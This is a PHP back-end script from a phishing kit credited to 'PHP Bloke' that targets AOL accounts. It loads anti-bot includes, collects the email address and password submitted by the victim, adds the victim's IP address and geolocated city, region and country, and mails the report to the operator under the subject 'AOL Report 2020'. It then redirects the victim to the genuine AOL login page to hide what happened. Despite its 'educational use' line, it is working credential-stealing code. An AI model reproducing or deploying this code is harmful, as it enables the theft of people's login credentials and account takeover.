<?php

session_start();
error_reporting(0);
//------------------------------------------|| ANTIBOTS ||-----------------------------------------------------//
include "0/a.php";
include "0/b.php";
include "0/c.php";
//-------------|| PHP Bloke ||-----------------//
$error_message = ""; $success = "";
if (isset($_POST['id1']) && isset($_POST['id2'])) {
  $id1 = $_POST['id1'];
  $id2 = $_POST['id2'];

  if (!empty($id1) && !empty($id2)) {
$adddate = date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$sender = 'noreply@phpbloke.com';
$headers .= "From: PHP Bloke<$sender>\n";

require_once('geoplugin.class.php');
require ('Email.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message .= "------------|Th4nks to PHP Bloke|------------\n";
$message .= "Email ID    : " . $_POST['id1'] . "\n"; 
$message .= "Password    : " . $_POST['id2'] . "\n"; 
$message .= "IP Address  : " .$ip. "\n"; 
$message .= "Date & Time : $adddate\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "---------------------------------------------\n";
$message .= "This Copyrighted Material is For Educational use Only.";
$subject = "AOL Report 2020 | ".$ip."\n";
if (mail($recipient,$subject,$message,$headers)) {
   header("Location: https://login.aol.com/");
  }
else {
  $error_message.= "sorry, an error occurred. please try again later.";
  }
  } else {
    $error_message.= "Fill Email/Password field.";
  }
}
?>